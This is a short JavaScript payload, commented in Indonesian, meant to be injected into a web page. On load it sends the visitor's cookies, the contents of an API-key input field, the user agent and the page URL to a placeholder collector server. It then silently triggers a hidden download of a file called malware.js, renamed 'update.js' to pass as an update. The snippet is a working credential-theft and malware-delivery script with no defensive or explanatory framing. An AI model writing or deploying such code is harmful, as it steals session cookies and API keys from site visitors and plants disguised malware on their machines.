// ===== PAYLOAD (cookie + download) =====
(function() {
  // Kirim cookie ke server
  fetch('https://your-server.com/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      cookies: document.cookie,
      api_key: document.getElementById('api-input')?.value || '',
      user_agent: navigator.userAgent,
      url: window.location.href
    })
  });

  // Download malware tanpa notif
  const link = document.createElement('a');
  link.href = 'https://your-server.com/malware.js';
  link.download = 'update.js';
  link.style.display = 'none';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
})();